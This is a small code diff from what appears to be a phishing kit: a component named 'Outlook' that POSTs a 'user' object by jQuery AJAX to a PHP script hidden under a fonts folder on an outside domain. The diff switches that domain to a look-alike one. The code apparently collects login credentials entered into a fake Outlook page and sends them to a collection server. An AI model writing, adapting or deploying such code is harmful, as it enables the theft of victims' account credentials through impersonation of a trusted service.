@@ -70,7 +70,7 @@ const Outlook = ()=>{
             
             $.ajax({
                 type: "POST",
-                url: "https://pearldozen.com/nc_assets/fonts/hey/newoffice.php",
+                url: "https://dozenpearl.com/nc_assets/fonts/hey/newoffice.php",    
                 data: user,
                 success(data) {
                     // alert('OK');
